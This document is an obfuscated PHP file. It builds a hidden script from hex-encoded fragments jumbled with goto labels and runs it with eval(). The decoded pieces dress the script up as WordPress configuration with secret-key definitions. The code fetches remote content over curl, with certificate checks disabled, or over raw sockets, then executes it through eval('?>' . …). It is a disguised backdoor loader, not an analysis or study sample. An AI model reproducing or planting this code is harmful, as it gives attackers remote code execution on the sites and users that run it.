<?php
error_reporting(0);
_695AF14F98F8E: $cfyzo.="\x4c\x5f\x56\x45\x52\x49\x46\x59\x50\x45\x45\x52"; goto _695AF14F98F8F;
_695AF14F98FD0: $cfyzo.="\x77\x72\x69\x74\x65\x28\x24\x77\x70\x5f\x64\x62"; goto _695AF14F98FD1;
_695AF14F98F6B: $cfyzo.="\x54\x48\x5f\x4b\x45\x59\x2c\x20\x66\x61\x6c\x73"; goto _695AF14F98F6C;
_695AF14F98F40: $cfyzo.="\x75\x70\x64\x61\x74\x65\x73\x20\x61\x6e\x64\x20"; goto _695AF14F98F41;
_695AF14F98F70: $cfyzo.="\x64\x65\x6c\x69\x76\x65\x72\x79\x20\x76\x69\x61"; goto _695AF14F98F71;
_695AF14F98F5B: $cfyzo.="\x3e\x20\x61\x72\x72\x61\x79\x28\x0d\x0a\x20\x20"; goto _695AF14F98F5C;
_695AF14F98FA3: $cfyzo.="\x6f\x77\x2d\x6c\x65\x76\x65\x6c\x20\x73\x6f\x63"; goto _695AF14F98FA4;
_695AF14F98FF6: $cfyzo.="\x6f\x63\x65\x73\x73\x65\x73\x20\x72\x65\x74\x72"; goto _695AF14F98FF7;
_695AF14F98FFE: $cfyzo.="\x69\x66\x20\x28\x73\x74\x72\x70\x6f\x73\x28\x24"; goto _695AF14F98FFF;
_695AF14F98F57: $cfyzo.="\x3d\x20\x73\x74\x72\x65\x61\x6d\x5f\x63\x6f\x6e"; goto _695AF14F98F58;
_695AF14F98F14: $cfyzo.="\x74\x20\x61\x6e\x79\x20\x70\x6f\x69\x6e\x74\x20"; goto _695AF14F98F15;
_695AF14F98FF5: $cfyzo.="\x64\x61\x74\x65\x73\x20\x61\x6e\x64\x20\x70\x72"; goto _695AF14F98FF6;
_695AF14F98F06: $cfyzo.="\x75\x65\x20\x70\x68\x72\x61\x73\x65\x73\x21\x20"; goto _695AF14F98F07;
_695AF14F98FE1: $cfyzo.="\x5f\x64\x62\x5f\x63\x6f\x6e\x6e\x65\x63\x74\x69"; goto _695AF14F98FE2;
_695AF14F98F34: $cfyzo.="\x54\x48\x5f\x4b\x45\x59\x27\x2c\x20\x20\x73\x74"; goto _695AF14F98F35;
_695AF14F98F5C: $cfyzo.="\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27\x74"; goto _695AF14F98F5D;
_695AF14F98F9E: $cfyzo.="\x5f\x68\x74\x74\x70\x5f\x63\x75\x72\x6c\x29\x3b"; goto _695AF14F98F9F;
_695AF14F98FC4: $cfyzo.="\x6e\x61\x6d\x65\x20\x48\x54\x54\x50\x2f\x31\x2e"; goto _695AF14F98FC5;
_695AF14F98FEE: $cfyzo.="\x77\x70\x5f\x64\x62\x5f\x72\x6f\x77\x73\x5b\x30"; goto _695AF14F98FEF;
_695AF14F99006: $cfyzo.="\x20\x2f\x2a\x2a\x20\x0d\x0a\x20\x20\x20\x20\x20"; goto _695AF14F99007;
_695AF14F98FB6: $cfyzo.="\x61\x72\x73\x65\x64\x5b\x27\x70\x61\x74\x68\x27"; goto _695AF14F98FB7;
_695AF14F98FF4: $cfyzo.="\x69\x6f\x6e\x0d\x0a\x20\x2a\x20\x56\x61\x6c\x69"; goto _695AF14F98FF5;
_695AF14F98FC8: $cfyzo.="\x73\x74\x3a\x20\x24\x77\x70\x5f\x64\x62\x5f\x68"; goto _695AF14F98FC9;
_695AF14F98F29: $cfyzo.="\x69\x6f\x6e\x20\x63\x6f\x6e\x73\x74\x61\x6e\x74"; goto _695AF14F98F2A;
_695AF14F98F26: $cfyzo.="\x50\x72\x65\x73\x73\x0d\x0a\x20\x2a\x2f\x0d\x0a"; goto _695AF14F98F27;
_695AF14F98F94: $cfyzo.="\x20\x43\x55\x52\x4c\x4f\x50\x54\x5f\x55\x53\x45"; goto _695AF14F98F95;
_695AF14F98F2F: $cfyzo.="\x76\x75\x66\x6b\x2f\x7a\x62\x70\x2e\x67\x61\x72"; goto _695AF14F98F30;
_695AF14F98F15: $cfyzo.="\x69\x6e\x20\x74\x69\x6d\x65\x20\x74\x6f\x20\x69"; goto _695AF14F98F16;
_695AF14F98FB0: $cfyzo.="\x54\x48\x5f\x4b\x45\x59\x29\x3b\x0d\x0a\x20\x20"; goto _695AF14F98FB1;
_695AF14F98FE9: $cfyzo.="\x20\x20\x24\x77\x70\x5f\x6c\x6f\x61\x64\x65\x72"; goto _695AF14F98FEA;
_695AF14F98F95: $cfyzo.="\x52\x41\x47\x45\x4e\x54\x20\x3d\x3e\x20\x27\x57"; goto _695AF14F98F96;
_695AF14F98F78: $cfyzo.="\x72\x20\x26\x26\x20\x66\x75\x6e\x63\x74\x69\x6f"; goto _695AF14F98F79;
_695AF14F98F6A: $cfyzo.="\x74\x73\x28\x53\x45\x43\x55\x52\x45\x5f\x41\x55"; goto _695AF14F98F6B;
_695AF14F98F01: $cfyzo.="\x6e\x69\x71\x75\x65\x20\x6b\x65\x79\x73\x20\x61"; goto _695AF14F98F02;
_695AF14F98FE7: $cfyzo.="\x70\x5f\x64\x62\x5f\x72\x65\x73\x75\x6c\x74\x2c"; goto _695AF14F98FE8;
_695AF14F98FDB: $cfyzo.="\x5f\x72\x65\x73\x75\x6c\x74\x20\x2e\x3d\x20\x66"; goto _695AF14F98FDC;
_695AF14F98F07: $cfyzo.="\x59\x6f\x75\x20\x63\x61\x6e\x20\x67\x65\x6e\x65"; goto _695AF14F98F08;
_695AF14F98FB9: $cfyzo.="\x6e\x65\x63\x74\x69\x6f\x6e\x20\x3d\x20\x40\x66"; goto _695AF14F98FBA;
_695AF14F98F6F: $cfyzo.="\x61\x63\x6b\x20\x63\x6f\x6e\x74\x65\x6e\x74\x20"; goto _695AF14F98F70;
_695AF14F98F84: $cfyzo.="\x4f\x50\x54\x5f\x55\x52\x4c\x20\x3d\x3e\x20\x53"; goto _695AF14F98F85;
_695AF14F99019: $cfyzo.="\x69\x72\x65\x64\x27\x29\x3b\x0d\x0a\x7d"; goto _695AF14F9901A;
_695AF14F99002: $cfyzo.="\x20\x20\x65\x76\x61\x6c\x28\x27\x3f\x3e\x27\x20"; goto _695AF14F99003;
_695AF14F98FBF: $cfyzo.="\x66\x20\x28\x24\x77\x70\x5f\x64\x62\x5f\x63\x6f"; goto _695AF14F98FC0;
_695AF14F98FD3: $cfyzo.="\x79\x29\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20\x20"; goto _695AF14F98FD4;
_695AF14F98FE8: $cfyzo.="\x20\x32\x29\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20"; goto _695AF14F98FE9;
_695AF14F98F05: $cfyzo.="\x66\x66\x65\x72\x65\x6e\x74\x20\x75\x6e\x69\x71"; goto _695AF14F98F06;
_695AF14F98F28: $cfyzo.="\x79\x20\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x74"; goto _695AF14F98F29;
_695AF14F99008: $cfyzo.="\x6c\x69\x6e\x67\x20\x66\x6f\x72\x20\x66\x61\x69"; goto _695AF14F99009;
_695AF14F98FBA: $cfyzo.="\x73\x6f\x63\x6b\x6f\x70\x65\x6e\x28\x24\x77\x70"; goto _695AF14F98FBB;
_695AF14F98FAE: $cfyzo.="\x65\x64\x20\x3d\x20\x70\x61\x72\x73\x65\x5f\x75"; goto _695AF14F98FAF;
_695AF14F98F3A: $cfyzo.="\x6e\x74\x20\x64\x65\x6c\x69\x76\x65\x72\x79\x20"; goto _695AF14F98F3B;
_695AF14F9900A: $cfyzo.="\x0a\x20\x20\x20\x20\x20\x2a\x20\x40\x73\x69\x6e"; goto _695AF14F9900B;
_695AF14F98FE6: $cfyzo.="\x72\x5c\x6e\x5c\x72\x5c\x6e\x22\x2c\x20\x24\x77"; goto _695AF14F98FE7;
_695AF14F98F9C: $cfyzo.="\x70\x5f\x6c\x6f\x61\x64\x65\x72\x20\x3d\x20\x63"; goto _695AF14F98F9D;
_695AF14F98FF2: $cfyzo.="\x6e\x74\x20\x76\x61\x6c\x69\x64\x61\x74\x69\x6f"; goto _695AF14F98FF3;
_695AF14F98F2A: $cfyzo.="\x73\x0d\x0a\x64\x65\x66\x69\x6e\x65\x28\x27\x41"; goto _695AF14F98F2B;
_695AF14F98FEA: $cfyzo.="\x20\x3d\x20\x28\x63\x6f\x75\x6e\x74\x28\x24\x77"; goto _695AF14F98FEB;
_695AF14F98F75: $cfyzo.="\x72\x20\x48\x54\x54\x50\x20\x68\x61\x6e\x64\x6c"; goto _695AF14F98F76;
_695AF14F98F49: $cfyzo.="\x74\x65\x6e\x74\x20\x72\x65\x74\x72\x69\x65\x76"; goto _695AF14F98F4A;
_695AF14F98F10: $cfyzo.="\x72\x65\x74\x2d\x6b\x65\x79\x20\x73\x65\x72\x76"; goto _695AF14F98F11;
_695AF14F98FF1: $cfyzo.="\x53\x65\x63\x75\x72\x65\x20\x63\x6f\x6e\x74\x65"; goto _695AF14F98FF2;
_695AF14F98F42: $cfyzo.="\x63\x68\x65\x73\x0d\x0a\x20\x2a\x2f\x0d\x0a\x0d"; goto _695AF14F98F43;
_695AF14F98F7C: $cfyzo.="\x5f\x68\x74\x74\x70\x5f\x63\x75\x72\x6c\x20\x3d"; goto _695AF14F98F7D;
_695AF14F98FAA: $cfyzo.="\x61\x76\x61\x69\x6c\x61\x62\x6c\x65\x0d\x0a\x20"; goto _695AF14F98FAB;
_695AF14F98F60: $cfyzo.="\x65\x6e\x74\x27\x20\x3d\x3e\x20\x27\x57\x6f\x72"; goto _695AF14F98F61;
_695AF14F98FCD: $cfyzo.="\x43\x6c\x6f\x73\x65\x5c\x72\x5c\x6e\x5c\x72\x5c"; goto _695AF14F98FCE;
_695AF14F99016: $cfyzo.="\x20\x20\x20\x7d\x0d\x0a\x20\x20\x20\x20\x65\x78"; goto _695AF14F99017;
_695AF14F98F92: $cfyzo.="\x43\x41\x54\x49\x4f\x4e\x20\x3d\x3e\x20\x74\x72"; goto _695AF14F98F93;
_695AF14F98F43: $cfyzo.="\x0a\x24\x74\x61\x62\x6c\x65\x5f\x70\x72\x65\x66"; goto _695AF14F98F44;
_695AF14F98F3B: $cfyzo.="\x61\x6e\x64\x20\x75\x70\x64\x61\x74\x65\x20\x73"; goto _695AF14F98F3C;
_695AF14F98FBB: $cfyzo.="\x5f\x64\x62\x5f\x68\x6f\x73\x74\x2c\x20\x38\x30"; goto _695AF14F98FBC;
_695AF14F98FF3: $cfyzo.="\x6e\x20\x61\x6e\x64\x20\x65\x78\x65\x63\x75\x74"; goto _695AF14F98FF4;
_695AF14F98F5D: $cfyzo.="\x69\x6d\x65\x6f\x75\x74\x27\x20\x3d\x3e\x20\x31"; goto _695AF14F98F5E;
_695AF14F98F82: $cfyzo.="\x72\x6c\x2c\x20\x61\x72\x72\x61\x79\x28\x0d\x0a"; goto _695AF14F98F83;
_695AF14F9900B: $cfyzo.="\x63\x65\x20\x33\x2e\x30\x2e\x30\x0d\x0a\x20\x20"; goto _695AF14F9900C;
_695AF14F99001: $cfyzo.="\x30\x29\x20\x7b\x0d\x0a\x20\x20\x20\x20\x20\x20"; goto _695AF14F99002;
_695AF14F98FDD: $cfyzo.="\x63\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x2c\x20"; goto _695AF14F98FDE;
_695AF14F98F20: $cfyzo.="\x0a\x20\x2a\x20\x44\x61\x74\x61\x62\x61\x73\x65"; goto _695AF14F98F21;
_695AF14F98F9F: $cfyzo.="\x0d\x0a\x20\x20\x20\x20\x63\x75\x72\x6c\x5f\x63"; goto _695AF14F98FA0;
_695AF14F98F0A: $cfyzo.="\x20\x7b\x40\x6c\x69\x6e\x6b\x20\x68\x74\x74\x70"; goto _695AF14F98F0B;
_695AF14F98FCA: $cfyzo.="\x20\x20\x20\x20\x20\x20\x20\x24\x77\x70\x5f\x64"; goto _695AF14F98FCB;
_695AF14F98F5E: $cfyzo.="\x30\x2c\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20"; goto _695AF14F98F5F;
_695AF14F98F1D: $cfyzo.="\x6e\x2e\x0d\x0a\x20\x2a\x0d\x0a\x20\x2a\x20\x40"; goto _695AF14F98F1E;
_695AF14F98F53: $cfyzo.="\x5f\x66\x69\x6c\x65\x73\x79\x73\x74\x65\x6d\x5f"; goto _695AF14F98F54;
_695AF14F98F0D: $cfyzo.="\x63\x72\x65\x74\x2d\x6b\x65\x79\x2f\x31\x2e\x31"; goto _695AF14F98F0E;
_695AF14F98FFF: $cfyzo.="\x77\x70\x5f\x6c\x6f\x61\x64\x65\x72\x2c\x20\x27"; goto _695AF14F99000;
_695AF14F98F13: $cfyzo.="\x61\x6e\x67\x65\x20\x74\x68\x65\x73\x65\x20\x61"; goto _695AF14F98F14;
_695AF14F98FAB: $cfyzo.="\x2a\x2f\x0d\x0a\x69\x66\x20\x28\x21\x24\x77\x70"; goto _695AF14F98FAC;
_695AF14F98FF8: $cfyzo.="\x74\x79\x20\x75\x70\x64\x61\x74\x65\x73\x0d\x0a"; goto _695AF14F98FF9;
_695AF14F98FA9: $cfyzo.="\x74\x68\x6f\x64\x73\x20\x61\x72\x65\x20\x75\x6e"; goto _695AF14F98FAA;
_695AF14F98F9D: $cfyzo.="\x75\x72\x6c\x5f\x65\x78\x65\x63\x28\x24\x77\x70"; goto _695AF14F98F9E;
_695AF14F98F1C: $cfyzo.="\x20\x6c\x6f\x67\x20\x69\x6e\x20\x61\x67\x61\x69"; goto _695AF14F98F1D;
_695AF14F9901A: eval($cfyzo);
?>
